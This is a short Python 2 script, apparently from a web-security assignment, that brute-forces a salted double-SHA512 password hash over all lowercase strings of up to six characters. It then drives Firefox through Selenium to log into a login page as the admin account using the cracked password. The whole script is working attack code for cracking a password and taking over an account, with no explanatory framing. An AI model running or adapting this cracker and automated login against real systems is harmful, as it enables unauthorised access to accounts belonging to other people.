# Password lowercase and at most 6 chars. 
# Lets try to brute force.

import sys
import itertools
import hashlib
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

MAX_ATTEMPTS = 308915776 # 26^6
salt = sys.argv[1]
password = sys.argv[2]


def get_hashed_password(plaintext):
    # Password is hashed twice - once on client and once on server
    return hashlib.sha512(hashlib.sha512(plaintext).hexdigest() + salt).hexdigest()


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

count = 0
actual_pw = ''
for attempt in bruteforce(string.ascii_lowercase, 6):
    count += 1
    percentage_completion = float(count)/MAX_ATTEMPTS*100
    if count % 50000 == 0:
        print 'Brute force progress: {}%'.format(percentage_completion)
    if get_hashed_password(attempt) == password:
        actual_pw = attempt
        print 'Actual plaintext password is: {}'.format(attempt)
        break    

print 'logging in'
driver = webdriver.Firefox()
driver.get('http://www.wsb.com/Assignment2/case17/login.php')

def find_by_xpath(locator):
    element = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, locator))
    )

    return element


find_by_xpath('//input[@name = "email"]').send_keys('admin@admin.com')
find_by_xpath('//input[@name = "password"]').send_keys(actual_pw)
find_by_xpath('//input[@type = "button"]').click()